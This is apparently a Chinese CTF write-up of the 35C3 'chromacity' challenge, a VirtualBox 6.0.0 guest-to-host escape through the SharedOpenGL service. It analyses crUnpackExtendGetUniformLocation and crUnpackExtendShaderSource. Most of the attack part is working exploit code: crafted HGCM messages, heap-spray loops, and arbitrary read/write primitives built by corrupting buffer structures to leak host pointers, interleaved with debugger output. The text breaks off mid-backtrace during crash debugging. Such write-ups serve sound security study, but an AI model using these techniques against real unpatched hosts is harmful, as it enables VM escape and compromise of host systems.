&amp;&amp; !defined(IN_GUEST)        msg-&gt;redirptr.CmdData = conn-&gt;CmdData;        CRVBOXHGSMI_CMDDATA_ASSERT_CONSISTENT(&amp;msg-&gt;redirptr.CmdData);        CRVBOXHGSMI_CMDDATA_CLEANUP(&amp;conn-&gt;CmdData);#endif        cached_type = msg-&gt;redirptr.pMessage-&gt;type;        conn-&gt;cbBuffer = 0;        conn-&gt;pBuffer  = NULL;#ifndef IN_GUEST\n如果conn-&gt;allow_redir_ptr被设置，会创建一个新的Msg，并设置type为CR_MESSAGE_REDIR_PTR，最后使用    crNetDispatchMessage( g_crvboxhgcm.recv_list, conn, msg, len );将消息挂到消息队列上，由此可见这是一种异步多线程的处理方式。最初调用crNetRecv就是为了将请求放到队列中慢慢处理。回到crVBoxServerInternalClientWriteRead函数\ncrNetRecv();CRASSERT(pClient-&gt;conn-&gt;pBuffer==NULL &amp;&amp; pClient-&gt;conn-&gt;cbBuffer==0);CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);crServerServiceClients();crStateResetCurrentPointers(&amp;cr_server.current);\n接下来该调用crServerServiceClients函数\nvoidcrServerServiceClients(void)&#123;    RunQueue *q;    q = getNextClient(GL_FALSE); /* don&#x27;t block */    while (q)     &#123;        ClientStatus stat = crServerServiceClient(q);        if (stat == CLIENT_NEXT &amp;&amp; cr_server.run_queue-&gt;next) &#123;            /* advance to next client */            cr_server.run_queue = cr_server.run_queue-&gt;next;        &#125;        q = getNextClient(GL_FALSE);    &#125;&#125;\n以上可以看出，他是依次取出请求对象，然后使用函数crServerServiceClient进行处理\n/** * Process incoming/pending message for the given client (queue entry). * \\return CLIENT_GONE if this client has gone away/exited, *         CLIENT_NEXT if we can advance to the next client *         CLIENT_MORE if we have to process more messages for this client.  */static ClientStatuscrServerServiceClient(const RunQueue *qEntry)&#123;    CRMessage *msg;    CRConnection *conn;    /* set current client pointer */    cr_server.curClient = qEntry-&gt;client;    conn = cr_server.run_queue-&gt;client-&gt;conn;    /* service current client as long as we can */    while (conn &amp;&amp; conn-&gt;type != CR_NO_CONNECTION &amp;&amp;                 crNetNumMessages(conn) &gt; 0) &#123;        unsigned int len;        /*        crDebug(&quot;%d messages on %p&quot;,                        crNetNumMessages(conn), (void *) conn);        */        /* Don&#x27;t use GetMessage, because we want to do our own crNetRecv() calls         * here ourself.         * Note that crNetPeekMessage() DOES remove the message from the queue         * if there is one.         */        len = crNetPeekMessage( conn, &amp;msg );..........................        /* Commands get dispatched here */        crServerDispatchMessage( conn, msg, len );\n该函数调用crServerDispatchMessage函数进行opcode的处理\n/** * This function takes the given message (which should be a buffer of * rendering commands) and executes it. */static voidcrServerDispatchMessage(CRConnection *conn, CRMessage *msg, int cbMsg)&#123;    const CRMessageOpcodes *msg_opcodes;    int opcodeBytes;    const char *data_ptr, *data_ptr_end;...............    if (msg-&gt;header.type == CR_MESSAGE_REDIR_PTR)    &#123;#ifdef VBOX_WITH_CRHGSMI        pCmdData = &amp;msg-&gt;redirptr.CmdData;#endif        msg = (CRMessage *) msg-&gt;redirptr.pMessage;    &#125;    CRASSERT(msg-&gt;header.type == CR_MESSAGE_OPCODES);    msg_opcodes = (const CRMessageOpcodes *) msg;    opcodeBytes = (msg_opcodes-&gt;numOpcodes + 3) &amp; ~0x03;#ifdef VBOXCR_LOGFPS    CRASSERT(cr_server.curClient &amp;&amp; cr_server.curClient-&gt;conn &amp;&amp; cr_server.curClient-&gt;conn-&gt;id == msg-&gt;header.conn_id);    cr_server.curClient-&gt;conn-&gt;opcodes_count += msg_opcodes-&gt;numOpcodes;#endif    data_ptr = (const char *) msg_opcodes + sizeof(CRMessageOpcodes) + opcodeBytes;    data_ptr_end = (const char *)msg_opcodes + cbMsg; // Pointer to the first byte after message data    enmType = crUnpackGetBufferType(data_ptr - 1,             /* first command&#x27;s opcode */                msg_opcodes-&gt;numOpcodes  /* how many opcodes */);    switch (enmType)    &#123;        case CR_UNPACK_BUFFER_TYPE_GENERIC:.................\t&#125;    if (fUnpack)    &#123;        crUnpack(data_ptr,                 /* first command&#x27;s operands */                 data_ptr_end,             /* first byte after command&#x27;s operands*/                 data_ptr - 1,             /* first command&#x27;s opcode */                 msg_opcodes-&gt;numOpcodes,  /* how many opcodes */                 &amp;(cr_server.dispatch));   /* the CR dispatch table */    &#125;..................&#125;\n而crServerDispatchMessage函数首先检查是否为msg-&gt;header.type == CR_MESSAGE_REDIR_PTR类型的消息，由于前面将原始消息挂在队列时，由于conn-&gt;allow_redir_ptr为true，所以消息确实是被转化为CR_MESSAGE_REDIR_PTR类型的。检查通过后，后面就调用了crUnpack函数来处理Opcode，其中crUnpack函数是通过脚本src/VBox/HostServices/SharedOpenGL/unpacker/unpack.py生成的，可以在编译后的目录out/linux.amd64/debug/obj/VBoxOGLgen/unpack.c里找到\nvoid crUnpack( const void *data, const void *data_end, const void *opcodes,         unsigned int num_opcodes, SPUDispatchTable *table )&#123;    unsigned int i;    const unsigned char *unpack_opcodes;    if (table != cr_lastDispatch)    &#123;        crSPUCopyDispatchTable( &amp;cr_unpackDispatch, table );        cr_lastDispatch = table;    &#125;    unpack_opcodes = (const unsigned char *)opcodes;    cr_unpackData = (const unsigned char *)data;    cr_unpackDataEnd = (const unsigned char *)data_end;#if defined(CR_UNPACK_DEBUG_OPCODES) || defined(CR_UNPACK_DEBUG_LAST_OPCODES)    crDebug(&quot;crUnpack: %d opcodes&quot;, num_opcodes);#endif    for (i = 0; i &lt; num_opcodes; i++)    &#123;            CRDBGPTR_CHECKZ(writeback_ptr);        CRDBGPTR_CHECKZ(return_ptr);            /*crDebug(&quot;Unpacking opcode \\%d&quot;, *unpack_opcodes);*/#ifdef CR_UNPACK_DEBUG_PREV_OPCODES        g_VBoxDbgCrPrevOpcode = *unpack_opcodes;#endif        switch( *unpack_opcodes )        &#123;\t\t\tcase CR_ALPHAFUNC_OPCODE:\t\t\t\t................\t\t\tcase CR_ARRAYELEMENT_OPCODE:\t\t\t\t..............\n可以看到这是Opcode处理机，根据不同的Opcode，对应不同的操作。在cr_opcodes.h头文件中有这些Opcode的定义。综上分析，SHCRGL_GUEST_FN_WRITE_READ_BUFFERED命令可以将buffer中的opcode进行处理，最后调用crVBoxServerClientRead将结果写回Guest，然后调用svcFreeBuffer对Buffer进行释放。\nrc = crVBoxServerClientRead(u32ClientID, pWriteback, &amp;cbWriteback);if (RT_SUCCESS(rc))&#123;    /* Update parameters.*/    paParms[1].u.pointer.size = cbWriteback;&#125;/* Return the required buffer size always */paParms[2].u.uint32 = cbWriteback;svcFreeBuffer(pSvcBuffer);\n我们可以写出如下的代码\nint main() &#123;   int idClient = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);   printf(&quot;idClient=%d\\n&quot;,idClient);   set_version(idClient);   getchar();   uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type                0x66666666, //conn_id                1, //numOpcodes                0x12345678,                0x61616161                &#125;;   crmsg(idClient,msg,sizeof(msg));&#125;\n\n0x02 35C3CTF Virtualbox NDaychromacity 477Solves: 2Please escape VirtualBox. 3D acceleration is enabled for your convenience.​No need to analyze the 6.0 patches, they should not contain security fixes.​Once you&#x27;re done, submit your exploit at https://vms.35c3ctf.ccc.ac/, but assume that all passwords are different on the remote setup.​Challenge files. Password for the encrypted VM image is the flag for &quot;sanity check&quot;.​Setup​UPDATE: You might need to enable nested virtualization.​Hint: https://github.com/niklasb/3dpwn/ might be useful​Hint 2: this photo was taken earlier today at C3​Difficulty estimate: hard\n题目的VirtualBox为6.0.0版本，通过参考资料已经知道了第一个漏洞点出在crUnpackExtendGetUniformLocation函数\ncrUnpackExtendGetUniformLocation分析void crUnpackExtendGetUniformLocation(void)&#123;    int packet_length = READ_DATA(0, int);    GLuint program = READ_DATA(8, GLuint);    const char *name = DATA_POINTER(12, const char);    SET_RETURN_PTR(packet_length-16);    SET_WRITEBACK_PTR(packet_length-8);    cr_unpackDispatch.GetUniformLocation(program, name);&#125;\n该函数没有检查packet_length，而该字段是我们从Guest中通过HGCM和Chromium协议传入的数据中的，因此完全可控。为了触发调用该函数，我们使用如下代码\nint main() &#123;   int idClient = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);   printf(&quot;idClient=%d\\n&quot;,idClient);   set_version(idClient);   getchar();   int offset = 0x200;   uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type                0x66666666, //conn_id                1, //numOpcodes                CR_EXTEND_OPCODE &lt;&lt; 24,                offset, //packet_length                CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode                0, //program                *(uint32_t *)&quot;leak&quot; //name                &#125;;   crmsg(idClient,msg,sizeof(msg));   for (int i=0;i&lt;100;i++) &#123;      printf(&quot;%02x &quot;,crmsg_buf[i]);   &#125;&#125;\n通过调试可以知道\nIn file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c   346 void crUnpackExtendGetUniformLocation(void)   347 &#123;   348     int packet_length = READ_DATA(0, int);   349     GLuint program = READ_DATA(8, GLuint);   350     const char *name = DATA_POINTER(12, const char); ► 351     SET_RETURN_PTR(packet_length-16);   352     SET_WRITEBACK_PTR(packet_length-8);   353     cr_unpackDispatch.GetUniformLocation(program, name);   354 &#125;   355 pwndbg&gt; x /20bx cr_unpackData+0x200-160x7f1adc9a03d0:\t0x08\t0x19\t0x00\t0x00\t0x01\t0x14\t0x00\t0x000x7f1adc9a03d8:\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x000x7f1adc9a03e0:\t0xfa\t0x6c\t0x28\t0xf2\nSET_RETURN_PTR操作将cr_unpackData+packet_length-16处的数据拷贝到了Guest中的crmsg_buf中，于是我们可以利用起来进行越界内存地址泄露为了泄露地址，我们首先使用heap spray布置堆风水。首先，我们得了解一下当我们与SharedOpenGL服务建立连接时，会创建哪些结构体，当与服务连接时，svcConnect会被HGCM协议调用进行连接初始化\nstatic DECLCALLBACK(int) svcConnect (void *, uint32_t u32ClientID, void *pvClient, uint32_t fRequestor, bool fRestoring)&#123;    RT_NOREF(pvClient, fRequestor, fRestoring);    if (g_u32fCrHgcmDisabled)    &#123;        WARN((&quot;connect not expected&quot;));        return VERR_INVALID_STATE;    &#125;    Log((&quot;SHARED_CROPENGL svcConnect: u32ClientID = %d\\n&quot;, u32ClientID));    int rc = crVBoxServerAddClient(u32ClientID);    return rc;&#125;\ncrVBoxServerAddClient函数如下\nint32_t crVBoxServerAddClient(uint32_t u32ClientID)&#123;    CRClient *newClient;.....    newClient = (CRClient *) crCalloc(sizeof(CRClient)); .....    newClient-&gt;conn = crNetAcceptClient(cr_server.protocol, NULL,                                        cr_server.tcpip_port,                                        cr_server.mtu, 0);.................&#125;\ncrNetAcceptClient函数如下\nCRConnection *crNetAcceptClient( const char *protocol, const char *hostname,                                     unsigned short port, unsigned int mtu, int broker )&#123;    CRConnection *conn;...................    conn = (CRConnection *) crCalloc( sizeof( *conn ) );&#125;\n可以看到这里申请了结构体CRClient和结构体CRConnection的内存。其中CRClient大小为0x9d0，CRConnection大小为0x298\n利用我们首先申请N个这么些大小的堆，用于消耗内存碎片\n//heap sprayfor (int i=0;i&lt;600;i++) &#123;   alloc_buf(client,0x298,&quot;CRConnection_size_fill&quot;,23);&#125;for (int i=0;i&lt;600;i++) &#123;   alloc_buf(client,0x9d0,&quot;CRClient_size_fill&quot;,23);&#125;\n然后接下来建立一个新的VBoxSharedCrOpenGL服务，由于前面内存碎片耗尽，此时的VBoxSharedCrOpenGL服务申请的CRClient和CRConnection很可能相邻\n//CRClient和CRConnection结构体将被创建int new_client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);for (int i=0;i&lt;600;i++) &#123;   alloc_buf(client,0x298,&quot;CRConnection_size_fill&quot;,23);&#125;for (int i=0;i&lt;600;i++) &#123;   alloc_buf(client,0x9d0,&quot;CRClient_size_fill&quot;,23);&#125;\n接下来，我们将new_client释放,然后使用同样大小的crmsg的buf占位，并且控制OPCODE使得程序进入crUnpackExtendGetUniformLocation函数\n//释放CRClient和CRConnection结构体hgcm_disconnect(new_client);uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type             0x66666666, //conn_id             1, //numOpcodes             CR_EXTEND_OPCODE &lt;&lt; 24,             OFFSET_PCLIENT, //packet_length             CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode             0, //program             *(uint32_t *)&quot;leak&quot; //name             &#125;;//将crmsg的unpack_buffer申请占位到之前的CRConnection结构体位置，从而进行数据泄露crmsg(client,0x298,msg,sizeof(msg));\n那么此时的cr_unpackData与原来new_client的空间重合，由于crmsg使用的buf是通过svcGetBuffer生成的，而之前分析过svcGetBuffer是通过RTMemAlloc(cbBufferSize);来申请堆的，RTMemAlloc函数不会清除原空间的内容，调试如下\nIn file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c   343     cr_unpackDispatch.GetAttribLocation(program, name);   344 &#125;   345    346 void crUnpackExtendGetUniformLocation(void)   347 &#123; ► 348     int packet_length = READ_DATA(0, int);   349     GLuint program = READ_DATA(8, GLuint);   350     const char *name = DATA_POINTER(12, const char);   351     SET_RETURN_PTR(packet_length-16);   352     SET_WRITEBACK_PTR(packet_length-8);   353     cr_unpackDispatch.GetUniformLocation(program, name);pwndbg&gt; tel cr_unpackData 10000:0000│ rdi 0x7fb89214f080 ◂— 0xa40000024801:0008│     0x7fb89214f088 ◂— 0x6b61656c0000000002:0010│     0x7fb89214f090 ◂— 0x0... ↓        2 skipped05:0028│     0x7fb89214f0a8 ◂— 0xffffffff06:0030│     0x7fb89214f0b0 ◂— 0x0... ↓        9 skipped10:0080│     0x7fb89214f100 ◂— 0x3e8000003e80011:0088│     0x7fb89214f108 ◂— 0x012:0090│     0x7fb89214f110 ◂— 0x013:0098│     0x7fb89214f118 ◂— 0x10000000014:00a0│     0x7fb89214f120 ◂— 0x0... ↓        2 skipped17:00b8│     0x7fb89214f138 ◂— 0x1b5818:00c0│     0x7fb89214f140 —▸ 0x7fb8a5cfc00c (crVBoxHGCMAlloc) ◂— push   rbp19:00c8│     0x7fb89214f148 —▸ 0x7fb8a5cfcd4e (crVBoxHGCMFree) ◂— push   rbp1a:00d0│     0x7fb89214f150 —▸ 0x7fb8a5cfc982 (crVBoxHGCMSend) ◂— push   rbp1b:00d8│     0x7fb89214f158 ◂— 0x0\n因此这里我们无需用到越界读也能泄露出原来CRConnection中的信息，我们泄露出位于0x248处的pClient地址以后，重新建立了一个新的VBoxSharedCrOpenGL服务，以便我们后续劫持该服务中的CRConnection中一些函数指针，从而控制程序流程\nuint64_t client_addr = *(uint64_t *)(crmsg_buf+0x10);//重新将新的CRClient和CRConnection结构体占位与此new_client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);LeakClient lc = &#123;     .new_client = new_client,     .client_addr = client_addr&#125;;/*for (int i=0;i&lt;100;i++) &#123;   printf(&quot;%02x &quot;,crmsg_buf[i]);&#125;*/return lc;\ncrUnpackExtendShaderSource分析现在来看第二个漏洞crUnpackExtendShaderSource函数\nvoid crUnpackExtendShaderSource(void)&#123;    GLint *length = NULL;    GLuint shader = READ_DATA(8, GLuint);    GLsizei count = READ_DATA(12, GLsizei);    GLint hasNonLocalLen = READ_DATA(16, GLsizei);    GLint *pLocalLength = DATA_POINTER(20, GLint);    char **ppStrings = NULL;    GLsizei i, j, jUpTo;    int pos, pos_check;    if (count &gt;= UINT32_MAX / sizeof(char *) / 4)    &#123;        crError(&quot;crUnpackExtendShaderSource: count %u is out of range&quot;, count);        return;    &#125;    pos = 20 + count * sizeof(*pLocalLength);    if (hasNonLocalLen &gt; 0)    &#123;        length = DATA_POINTER(pos, GLint);        pos += count * sizeof(*length);    &#125;    pos_check = pos;    if (!DATA_POINTER_CHECK(pos_check))    &#123;        crError(&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;, pos_check);        return;    &#125;    for (i = 0; i &lt; count; ++i)    &#123;        if (pLocalLength[i] &lt;= 0 || pos_check &gt;= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))        &#123;            crError(&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;, pos_check);            return;        &#125;        pos_check += pLocalLength[i];    &#125;    ppStrings = crAlloc(count * sizeof(char*));    if (!ppStrings) return;    for (i = 0; i &lt; count; ++i)    &#123;        ppStrings[i] = DATA_POINTER(pos, char);        pos += pLocalLength[i];        if (!length)        &#123;            pLocalLength[i] -= 1;        &#125;        Assert(pLocalLength[i] &gt; 0);        jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];        for (j = 0; j &lt; jUpTo; ++j)        &#123;            char *pString = ppStrings[i];            if (pString[j] == &#x27;\\0&#x27;)            &#123;                Assert(j == jUpTo - 1);                pString[j] = &#x27;\\n&#x27;;            &#125;        &#125;    &#125;//    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);    cr_unpackDispatch.ShaderSource(shader, 1, (const char**)ppStrings, 0);    crFree(ppStrings);&#125;\n该函数的中间的一个循环，每次循环开始，检查前一次累加出的pos_check是否越界，显然经过这样的检查，pos_check肯定在INT32_MAX范围内，但是后一个范围即DATA_POINTER_CHECK(pos_check)的检查则不一定了\nfor (i = 0; i &lt; count; ++i)    &#123;        if (pLocalLength[i] &lt;= 0 || pos_check &gt;= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))        &#123;            crError(&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;, pos_check);            return;        &#125;        pos_check += pLocalLength[i];    &#125;\n因为对于最后一次的循环，pLocalLength[i];可以为任意大小的值，将其累加到pos_check上面以后，就退出了循环，没有再次检查pos_check是否还在DATA_POINTER范围内。由于上述的检查不充分，下方的循环将导致溢出\nAssert(pLocalLength[i] &gt; 0);jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];for (j = 0; j &lt; jUpTo; ++j)&#123;    char *pString = ppStrings[i];    if (pString[j] == &#x27;\\0&#x27;)    &#123;        Assert(j == jUpTo - 1);        pString[j] = &#x27;\\n&#x27;;    &#125;&#125;\n虽然存在Assert(j == jUpTo - 1);的检查，但是对于release版本，在编译时Assert会被去掉。因此，上述代码可以溢出指定长度，并将后方为空字节的数据替换为\\n。\n利用对于这种溢出，一个好的利用方式就是通过它将\\0替换为\\n的特性将某些类似于Buffer的对象的length修改，从而使得该Buffer能够越界溢出，进而控制其他对象。前面SHCRGL_GUEST_FN_WRITE_BUFFER命令创建的CRVBOXSVCBUFFER_t对象是一个很好的选择，该对象结构如下\ntypedef struct _CRVBOXSVCBUFFER_t &#123;    uint32_t uiId;    uint32_t uiSize;    void*    pData;    _CRVBOXSVCBUFFER_t *pNext, *pPrev;&#125; CRVBOXSVCBUFFER_t;\n将该对象布局到cr_unpackData后方，通过溢出，可以将CRVBOXSVCBUFFER_t中的uiSize改大，从而使得该CRVBOXSVCBUFFER_t能够溢出。假设在该CRVBOXSVCBUFFER_t的pData指向的内存后方还有一个CRVBOXSVCBUFFER_t,那么通过溢出，可以控制后面整个CRVBOXSVCBUFFER_t，从而实现任意地址读写。首先通过申请大量的Buffer，消耗内存碎片，最后申请的几个Buffer就很大可能连续\nuint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type             0x66666666, //conn_id             1, //numOpcodes             CR_EXTEND_OPCODE &lt;&lt; 24,             0x12345678,             CR_SHADERSOURCE_EXTEND_OPCODE, //extend opcode             0, //shader             2, //count             0, //hasNonLocalLen             0x1,0x100, // *pLocalLength             0x12345678 //padding             &#125;;for (int i=0;i&lt;0x1000-0x4;i++) &#123;    alloc_buf(client,sizeof(msg),&quot;heap fengshui&quot;,23);&#125;int buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));int buf2 = alloc_buf(client,sizeof(msg),&quot;aaaaaaaaaaaaa&quot;,sizeof(msg));int buf3 = alloc_buf(client,sizeof(msg),&quot;bbbbbbbbbbbbb&quot;,sizeof(msg));int buf4 = alloc_buf(client,sizeof(msg),&quot;ccccccccccccc&quot;,sizeof(msg));crmsg_with_bufid(client,buf1);\n如上代码，我们选择buf1作为cr_unpackData，想要通过buf1溢出修改buf2的uiSize，调试如下\nIn file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c   79     if (!ppStrings) return;   80    81     for (i = 0; i &lt; count; ++i)   82     &#123;   83         ppStrings[i] = DATA_POINTER(pos, char); ► 84         pos += pLocalLength[i];   85         if (!length)   86         &#123;   87             pLocalLength[i] -= 1;   88         &#125;   89 pwndbg&gt; x /2gx ppStrings0x7fb890f34ed0:\t0x00007fb893001fcc\t0x00007fb893001fcdpwndbg&gt; x /20gx 0x00007fb893001fcd0x7fb893001fcd:\t0x0000000000123456\t0x00000000350000000x7fb893001fdd:\t0x3000007b06000000\t0xb8930020100000000x7fb893001fed:\t0xb893001f7000007f\t0xb89300205000007f0x7fb893001ffd:\t0x000000000000007f\t0x00000000450000000x7fb89300200d:\t0x6161616161000000\t0x61616161616161610x7fb89300201d:\t0x6262626262626200\t0x63006262626262620x7fb89300202d:\t0x6363636363636363\t0x43646900636363630x7fb89300203d:\t0x000000000065696c\t0x00000000350000000x7fb89300204d:\t0x3000007b07000000\t0xb8930020800000000x7fb89300205d:\t0xb893001fe000007f\t0xb8930020c000007f\n通过上面调试的数据，可以知道，我们的堆风水已经弄好了，现在就是溢出，修改buf2的uiSize，我们先通过调试，确定精确的溢出偏移大小，仅达到修改uiSize，保证其后面的数据不被破坏\nIn file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c    91         jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];    92         for (j = 0; j &lt; jUpTo; ++j)    93         &#123;    94             char *pString = ppStrings[i];    95  ►  96             if (pString[j] == &#x27;\\0&#x27;)    97             &#123;    98                 Assert(j == jUpTo - 1);    99                 pString[j] = &#x27;\\n&#x27;;   100             &#125;   101         &#125;pwndbg&gt; x /20wx pString+0x30x7fb893001fd0:\t0x00000000\t0x00000000\t0x00000035\t0x000000000x7fb893001fe0:\t0x00007b06\t0x00000030\t0x93002010\t0x00007fb80x7fb893001ff0:\t0x93001f70\t0x00007fb8\t0x93002050\t0x00007fb80x7fb893002000:\t0x00000000\t0x00000000\t0x00000045\t0x000000000x7fb893002010:\t0x61616161\t0x61616161\t0x61616161\t0x62620061\n我们确定出修改uiSize需要0x1B的偏移如图，buf2的uiSize已经成功被修改，现在我们就可以利用buf2修改buf3的CRVBOXSVCBUFFER_t结构体，构造任意地址读写原语。由于此处的堆是通过glibc申请的，因此当我们修改uiSize后，glibc堆chunk的头部也已经损坏，此时调用到svcFreeBuffer(pSvcBuffer);时，在glibc2.23环境下，虚拟机会发生崩溃。因此我们在ubuntu 1804上进行测试，由于glibc 2.27有tcache机制，不会检查chunk的size因此可以在glibc 2.27及以上完成利用。当在glibc2.27及以上环境时，我们换一种方式来布置堆风水\nint buf1,buf2,buf3,buf4;for (int i=0;i&lt;0x4000;i++) &#123;    buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));    buf2 = alloc_buf(client,sizeof(msg),&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,sizeof(msg));    buf3 = alloc_buf(client,sizeof(msg),&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;,sizeof(msg));    buf4 = alloc_buf(client,sizeof(msg),&quot;cccccccccccccccccccccccccccccccccccccc&quot;,sizeof(msg));&#125;crmsg_with_bufid(client,buf1);\n这样使得buf1、buf2、buf3、buf4相邻的可能比较大。现在，我们已经可以通过buf2来控制整个buf3的CRVBOXSVCBUFFER_t了，那么我们可以构造出任意地址写的原语\nint arb_write(int client,uint64_t addr,uint32_t size,void *buf) &#123;   ArbWrite data = &#123;      .size = size,      .addr = addr   &#125;;   //set CRVBOXSVCBUFFER_t&#x27;s pData and size   write_buf(client,oob_buf,0xa30,0x44,&amp;data,sizeof(data));   //arb write   write_buf(client,arb_buf,size,0,buf,size);   return 0;&#125;\n有了任意地址写的原语以后，我们就要考虑如何构造任意地址读的原语。在svcCall中，有一条命令SHCRGL_GUEST_FN_READ，\n       case SHCRGL_GUEST_FN_READ:        &#123;.........            /* Fetch parameters. */            uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;            uint32_t cbBuffer = paParms[0].u.pointer.size;            /* Execute the function. */            rc = crVBoxServerClientRead(u32ClientID, pBuffer, &amp;cbBuffer);\n该命令会调用crVBoxServerClientRead函数，进一步进入crVBoxServerInternalClientRead函数\nint32_t crVBoxServerInternalClientRead(CRClient *pClient, uint8_t *pBuffer, uint32_t *pcbBuffer)&#123;    if (pClient-&gt;conn-&gt;cbHostBuffer &gt; *pcbBuffer)    &#123;        crDebug(&quot;crServer: [%lx] ClientRead u32ClientID=%d FAIL, host buffer too small %d of %d&quot;,                  crThreadID(), pClient-&gt;conn-&gt;u32ClientID, *pcbBuffer, pClient-&gt;conn-&gt;cbHostBuffer);        /* Return the size of needed buffer */        *pcbBuffer = pClient-&gt;conn-&gt;cbHostBuffer;        return VERR_BUFFER_OVERFLOW;    &#125;    *pcbBuffer = pClient-&gt;conn-&gt;cbHostBuffer;    if (*pcbBuffer)    &#123;        CRASSERT(pClient-&gt;conn-&gt;pHostBuffer);        crMemcpy(pBuffer, pClient-&gt;conn-&gt;pHostBuffer, *pcbBuffer);        pClient-&gt;conn-&gt;cbHostBuffer = 0;    &#125;    return VINF_SUCCESS;&#125;\n关键的一句代码crMemcpy(pBuffer, pClient-&gt;conn-&gt;pHostBuffer, *pcbBuffer);，可见该命令的作用是将pClient-&gt;conn-&gt;pHostBuffer中的内容拷贝给Guest，由于现在我们实现了任意地址写，并且pClient-&gt;conn的地址也已经知道，那么我们可以控制pHostBuffer，从而实现任意地址读。\nint arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) &#123;   //设置pHostBuffer为目的地址   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&amp;addr);   //设置size   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&amp;size);   //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容   return read_hostbuf(client,0x100,buf);&#125;\n现在利用任意地址读，泄露出CRConnection中的函数指针\n//读取函数指针，泄露地址arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);uint64_t alloc_addr = *((uint64_t *)buff);printf(&quot;alloc_addr=0x%lx\\n&quot;,alloc_addr);\n当我们调试时，发现当我们的程序运行完毕以后，虚拟机就是崩溃\npwndbg&gt; k#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51#1  0x00007f0b1da41921 in __GI_abort () at abort.c:79#2  0x00007f0b1da8a967 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7f0b1dbb7b0d &quot;%s\\n&quot;) at ../sysdeps/posix/libc_fatal.c:181#3  0x00007f0b1da919da in malloc_printerr (str=str@entry=0x7f0b1dbb9818 &quot;double free or corruption (out)&quot;) at malloc.c:5342#4  0x00007f0b1da98f6a in _int_free (have_lock=0, p=0x7f0abb1470a0, av=0x7f0b1ddecc40 &lt;main_arena&gt;) at malloc.c:4308#5  __GI___libc_free (mem=0x7f0abb1470b0) at malloc.c:3134#6  0x00007f0b2051da8f in RTMemFree (pv=&lt;optimized out&gt;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/alloc.cpp:262#7  0x00007f0abaf25c4f in crFree (ptr=&lt;optimized out&gt;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/mem.c:128#8  0x00007f0abaf385c9 in _crVBoxCommonDoDisconnectLocked (conn=0x7f0a04b05f50) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1370#9  crVBoxHGCMDoDisconnect (conn=0x7f0a04b05f50) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1412#10 0x00007f0abb171909 in crVBoxServerRemoveClientObj (pClient=0x7f0a05bd8d70) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:677#11 crVBoxServerRemoveClient (u32ClientID=43) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:716#12 0x00007f0abb160945 in svcDisconnect (u32ClientID=&lt;optimized out&gt;, pvClient=&lt;optimized out&gt;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:144#13 0x00007f0afdaa1eb4 in hgcmServiceThread (pThread=0x7f0ab0003a60, pvUser=0x7f0ab0003900) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:684#14 0x00007f0afda9fd5f in hgcmWorkerThreadFunc (hThreadSelf=&lt;optimized out&gt;, pvUser=0x7f0ab0003a60) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200#15 0x00007f0b204b5e7c in rtThreadMain (pThread=pThread@entry=0x7f0ab0003c90, NativeThread=NativeThread@entry=139684077311744, pszThreadName=pszThreadName@entry=0x7f0ab0004570 &quot;ShCrOpenGL&quot;) at 